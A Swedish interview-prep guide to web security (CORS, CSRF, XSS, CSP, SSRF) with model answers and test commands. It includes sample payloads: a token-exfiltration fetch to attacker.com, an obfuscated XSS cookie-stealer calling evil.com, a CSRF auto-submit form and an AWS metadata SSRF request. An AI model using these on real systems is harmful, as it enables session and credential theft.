# 🛡️ Security: Web Security End-to-End (CORS, CSRF, XSS & CSP)

> **Intervju-fokus:** Fullstack AppSec, Token Storage dilemmat, Browser Security Model vs Server Protection, SameSite cookies och Content Security Policy (CSP).

---

## 🎯 Scenario 1: CORS vs Same-Origin Policy (SOP) & Preflight Storms

### Problem (Vad kraschar / varför bryr vi oss)
Ett team bygger en frontend på `https://app.example.com` och en backend på `https://api.example.com`. 
Utvecklaren möts av det ökända felet i webbläsarkonsolen:
```text
Access to fetch at 'https://api.example.com/v1/orders' from origin 'https://app.example.com' 
has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present on the requested resource.
```
För att "lösa" problemet lägger en frustrerad utvecklare till:
```java
// Farlig "lösning" som öppnar säkerhetshål och dessutom kraschar med credentials:
@CrossOrigin(origins = "*", allowCredentials = "true") // Kraschar i browsern!
```
Webbläsaren kastar då:
```text
The value of the 'Access-Control-Allow-Origin' header in the response must not be the wildcard '*' 
when the request's credentials mode is 'include'.
```
Dessutom märker DevOps att servern tar emot dubbelt så många requests eftersom varje `POST` eller anrop med `Authorization: Bearer ...` triggar ett förberedande HTTP `OPTIONS`-anrop (**Preflight Request**) som tar 150 ms extra för varje API-anrop.

Och den största **intervjufällan**: Utvecklaren tror att CORS skyddar deras API mot attacker, men en angripare kan fortfarande göra:
```bash
curl -X POST https://api.example.com/v1/orders -d '{"amount": 1000}'
```
...och anropet går rakt igenom! CORS skyddade inte servern alls!

---

### Keyword Bingo (Facit-lingo)
* **Same-Origin Policy (SOP):** Webbläsarens grundläggande säkerhetsmekanism som hindrar skript från ett ursprung (protokoll, domän, port) från att läsa svar från ett annat ursprung.
* **CORS (Cross-Origin Resource Sharing):** Ett protokoll som låter en server selektivt *luckra upp* webbläsarens SOP genom att explicit deklarera vilka externa origins som tillåts läsa dess resurser.
* **CORS is a Browser Sandbox Feature, NOT Server Defense:** CORS skyddar användarens session i webbläsaren mot skadliga webbplatser; det skyddar aldrig servern mot direkta anrop från cURL, Postman eller bots.
* **Preflight Request (`OPTIONS`):** Ett automatiskt förberedande HTTP-anrop som webbläsaren skickar vid "icke-enkla" anrop (egna headers som `Authorization`, content-types som `application/json`, eller metoder som `PUT`/`DELETE`).
* **`Access-Control-Max-Age`:** Respons-headern som instruerar webbläsaren att cacha preflight `OPTIONS`-svaret (t.ex. 86400 sekunder), vilket eliminerar 50% av den onödiga nätverkslatensen.
* **Wildcard (`*`) with Credentials Trap:** W3C-specifikationen förbjuder strikt kombinationen av `Access-Control-Allow-Origin: *` och `Access-Control-Allow-Credentials: true` för att förhindra att obehöriga sajter stjäl sessionscookies.
* **Vary: Origin:** HTTP-header som instruerar CDN och proxycacher att inte serva ett cachat CORS-svar för Origin A till en användare från Origin B.

---

### Verklighets-svar (30–60 sek)
> "CORS är en av de mest missförstådda teknikerna. Många tror att CORS är en brandvägg för servern, men CORS är en mekanism i *webbläsaren* för att skydda användaren genom att selektivt lätta på Same-Origin Policy. En hacker kan alltid anropa backend direkt via cURL eller Python utan att CORS bryr sig ett dugg – serverskydd kräver autentisering och rate limiting.
> 
> I produktion gör jag tre saker: För det första tillåter jag aldrig wildcard `*` med credentials, utan reflekterar strikt vitlistade origins tillsammans med `Vary: Origin`. För det andra sätter jag alltid `Access-Control-Max-Age: 86400` på preflight-anrop så att webbläsaren cachar `OPTIONS`-anropet istället för att fördubbla nätverkslatensen vid varje unikt API-anrop. För det tredje separerar jag publika API:er från interna genom att hålla interna tjänster bakom en gemensam Reverse Proxy (API Gateway) på samma domän."

---

### Senior Intervju-djupdykning
* **Varför kastar webbläsaren ett CORS-fel även om servern faktiskt bearbetade anropet?**
  Webbläsaren skickar ofta själva anropet (om det är en Simple Request, t.ex. en standard `GET`). Servern kör koden, sparar datan och returnerar 200 OK. Men när svaret når webbläsaren och saknar `Access-Control-Allow-Origin`, *vägrar webbläsaren att lämna ut svarsdatan till JavaScript-koden*. För state-mutationer skickas dock preflight `OPTIONS` först för att förhindra att mutationen ens når servern om ursprunget är otillåtet.
* **Hur optimerar man bort preflight-stormar i SPA-arkitektur?**
  1. Sätt `Access-Control-Max-Age: 3600` (eller upp till browserns maxtak, t.ex. 7200 i WebKit / 86400 i Chromium).
  2. Använd en gemensam domän via API Gateway (Reverse Proxy / BFF) så att frontend anropar `/api/...` istället för en separat subdomän – då sker anropet **Same-Origin** och noll CORS/Preflight behövs!

---

## 🎯 Scenario 2: Token Storage War – `localStorage` (XSS) vs `httpOnly` Cookies (CSRF)

### Problem (Vad kraschar / varför bryr vi oss)
Ett team diskuterar var användarens JWT (Access Token och Refresh Token) ska sparas i React/Next.js:
1. **Lösning A (`localStorage`):** 
   Utvecklaren sparar `localStorage.setItem("token", jwt)`.
   *Katastrofen:* Teamet installerar ett populärt npm-paket för datumformatering eller analys. Paketet drabbas av en supply chain-attack (eller ett XSS-hål finns i en formulärkomponent). Angriparens injicerade skript kör:
   ```javascript
   fetch('https://attacker.com/steal?t=' + localStorage.getItem('token'));
   ```
   Samtliga användares konton komprometteras omedelbart och tyst!
2. **Lösning B (Standard Cookies):**
   Teamet byter till cookies, men konfigurerar inte flaggorna rätt. När en användare besöker en elakartad sajt `https://evil.com`, kör sidan i bakgrunden:
   ```html
   <form action="https://bank.com/api/transfer" method="POST">
     <input type="hidden" name="amount" value="100000" />
     <input type="hidden" name="to" value="attacker" />
   </form>
   <script>document.forms[0].submit();</script>
   ```
   Webbläsaren skickar automatiskt med bankens cookie (**Cross-Site Request Forgery - CSRF**)!

---

### Keyword Bingo (Facit-lingo)
* **`httpOnly` Flag:** Webbläsarflagga på cookies som gör det omöjligt för JavaScript (`document.cookie`) att läsa cookien, vilket neutraliserar 100% av stöldförsök via XSS.
* **`Secure` Flag:** Garanterar att cookien endast krypteras och överförs via HTTPS; sänds aldrig över osäker HTTP.
* **`SameSite=Strict` vs `SameSite=Lax` vs `SameSite=None`:**
  * *Strict:* Cookien skickas aldrig vid cross-site navigation, inte ens om användaren klickar på en länk från Google.
  * *Lax (Modern default):* Skickas vid top-level navigation (`GET`-länkar), men aldrig vid cross-site `POST`, `PUT` eller `iframe`-inbäddning.
  * *None:* Kräver `Secure` och tillåter cross-site delning (nödvändigt vid renodlade tredje-parts widgets).
* **Double Submit Cookie Pattern:** Statlös CSRF-skyddsmetod där servern sätter en slumpmässig CSRF-token i en cookie samt kräver att samma token skickas i en HTTP-header (`X-CSRF-Token`). Eftersom en extern sajt inte kan läsa cookien pga SOP kan den inte sätta rätt header.
* **In-Memory Access Token + Refresh Token Rotation:** Säker arkitektur där kortlivade access-tokens (5 min) enbart hålls i JavaScript-minnet (variabel, ej lagring) medan den långlivade refresh-tokenen ligger i en skyddad `httpOnly; Secure; SameSite=Strict` cookie som roteras vid varje användning.
* **XSS Blast Radius:** Skillnaden mellan att en angripare kan exekvera logik i användarens aktiva session kontra att de kan exportera nyckeln och behålla åtkomst i månader.

---

### Verklighets-svar (30–60 sek)
> "Att spara långlivade tokens i `localStorage` är ett allvarligt säkerhetsmisstag eftersom all JavaScript på sidan – inklusive tredjeparts npm-paket, Google Tag Manager och externa analysskript – har full läsåtkomst. Vid minsta lilla XSS-sårbarhet exfiltreras token direkt.
> 
> Som senior implementerar jag mönstret med **In-Memory Access Token + HttpOnly Refresh Token**:
> Access-token hålls enbart i JavaScript-minnet med 5–15 minuters livslängd. Refresh-token sätts som en `httpOnly; Secure; SameSite=Strict` cookie bunden till en specifik `/api/auth/refresh`-path. Därmed kan XSS inte stjäla refresh-token, och `SameSite=Strict` i kombination med en anpassad header eliminerar CSRF-risken helt."

---

### Senior Intervju-djupdykning
* **Om vi använder `httpOnly` cookies, varför behöver vi fortfarande oroa oss för XSS?**
  Även om angriparen inte kan *läsa* cookien och skicka den till sin egen server, kan deras injicerade XSS-skript fortfarande köra `fetch('/api/account/delete')` *inuti* den legitima användarens browser. Webbläsaren bifogar automatiskt cookien! Därför måste XSS alltid förebyggas med input sanitization, Reacts inbyggda escaping och strikt CSP.
* **Vad är 'Refresh Token Rotation' och återanvändningsdetektering (Re-use Detection)?**
  Varje gång en refresh-token används för att generera en ny access-token ogiltigförklaras den gamla och en helt ny refresh-token utfärdas. Om servern upptäcker att en redan förbrukad refresh-token presenteras igen vet vi att token har stulits, varpå *samtliga* aktiva sessioner för användaren omedelbart spärras.

---

## 🎯 Scenario 3: Content Security Policy (CSP) & SSRF i Molnet

### Problem (Vad kraschar / varför bryr vi oss)
1. **Frontend-kraschen (XSS & Data Exfiltration):**
   Ett team upptäcker att en elakartad kommentar på en produktsida innehåller:
   ```html
   <img src="x" onerror="eval(atob('ZmV0Y2goJ2h0dHBzOi8vZXZpbC5jb20/Y29va2llPScgKyBkb2N1bWVudC5jb29raWUp'))">
   ```
   Webbläsaren laddar och kör koden, och skickar känslig användardata till angriparens domän.
2. **Backend-kraschen (Server-Side Request Forgery - SSRF):**
   Backend har en funktion: *"Ange din avatar-URL så hämtar vår server bilden"*.
   En angripare skickar:
   ```json
   { "avatarUrl": "http://169.254.169.254/latest/meta-data/iam/security-credentials/" }
   ```
   Servern (som körs i AWS EC2/ECS/EKS) anropar den lokala instansmetadatan (IMDSv1), hämtar nodens IAM-roller och hemliga AWS-nycklar, och returnerar dem till angriparen!

---

### Keyword Bingo (Facit-lingo)
* **Content Security Policy (CSP):** HTTP-responsheader (`Content-Security-Policy`) som instruerar webbläsaren exakt vilka källor för skript, stilar, bilder och nätverksanrop som tillåts.
* **Nonce-based CSP:** Att generera en kryptografiskt slumpmässig engångssträng (`nonce="rAnd0m123"`) per HTTP-request som måste matcha skript-taggen för att webbläsaren ska tillåta exekvering.
* **`default-src 'self'`:** Säkerhetsprincipen att stänga alla externa anslutningar som standard och endast öppna specifika direktiv (`script-src`, `connect-src`, `img-src`).
* **Server-Side Request Forgery (SSRF):** En sårbarhet där en angripare lurar servern att göra HTTP-förfrågningar till interna, icke-publika nätverksresurser (t.ex. localhost eller molnleverantörers metadata).
* **AWS IMDSv2 (Instance Metadata Service v2):** Sessionsbaserad metadatatjänst i AWS som kräver en `PUT`-förfrågan med `X-aws-ec2-metadata-token` för att hämta tokens, vilket blockerar de flesta enkla SSRF-angrepp.
* **Private IP Blocklist / DNS Rebinding Protection:** Skyddsmekanism i backend som resolvar URL-domänen och kastar fel om IP-adressen tillhör privata subnät (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `127.0.0.1`, `169.254.169.254`).

---

### Verklighets-svar (30–60 sek)
> "Säkerhet i djupet kräver att vi begränsar skadan även om en sårbarhet skulle uppstå. På frontend är **Content Security Policy (CSP)** vårt starkaste försvar: genom att sätta `default-src 'self'` och använda kryptografiska `nonces` på godkända skript kan inte ens ett framgångsrikt XSS-injektionsförsök exekvera `eval()` eller skicka data till angriparens server via `connect-src`.
> 
> På backend skyddar vi oss mot **SSRF** när användare tillhandahåller externa URL:er genom att alltid tvinga fram IP-validering mot en blocklist för privata och lokala adresser (som RFC 1918 och molnmetadata `169.254.169.254`). Dessutom konfigurerar vi alltid AWS IMDSv2 med sessionstokens och nollställer onödiga nätverksåtkomster från applikationspoddar."

---

### Felsökningsguide (CLI & Curl)
Testa serverns CORS-konfiguration:
```bash
# Simulera ett preflight OPTIONS-anrop från en extern origin
curl -I -X OPTIONS https://api.example.com/v1/orders \
  -H "Origin: https://malicious-site.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Authorization"
```
Kontrollera att svaret INTE innehåller `Access-Control-Allow-Origin: https://malicious-site.com` eller `*`.

Testa CSP-headers:
```bash
curl -I https://app.example.com | grep -i "content-security-policy"
```

Verifiera att AWS IMDSv2 är aktivt och IMDSv1 är avstängt:
```bash
aws ec2 modify-instance-metadata-options \
  --instance-id i-1234567890abcdef0 \
  --http-tokens required \
  --http-endpoint enabled
```

---

## 🛠️ Koden & Verifiering

* **The Flaw & The Fix:** [SecurityPatternsLab.java](file:///security/01-web-security-cors-csrf-xss/SecurityPatternsLab.java)
  * *Flaw:* `FlawedCorsHandler` tillåter wildcard med credentials; `FlawedUrlFetcher` tillåter SSRF-anrop till `169.254.169.254` och interna IP:n; `buildInsecureCookie` saknar HttpOnly och SameSite.
  * *Fix:* `SecureCorsHandler` reflekterar enbart tillåtna origins och sätter `Access-Control-Max-Age: 86400`; `SsrfValidator` blockerar loopback, cloud metadata och privata subnät (RFC 1918); `CookieBuilder` genererar `HttpOnly; Secure; SameSite=Strict`.
* **Verification Test:** [SecurityPatternsVerificationTest.java](file:///security/01-web-security-cors-csrf-xss/SecurityPatternsVerificationTest.java)
  * Testar att CORS-fällan fångas och att godkända origins cachas.
  * Testar att SSRF blockerar AWS metadata, localhost och RFC1918 private IPs men godkänner publika domäner.
  * Testar att cookie-flaggor sätts korrekt för att motverka XSS och CSRF.

---

## 🧪 Så här kör du testerna

```bash
cd security/01-web-security-cors-csrf-xss
mvn test
```
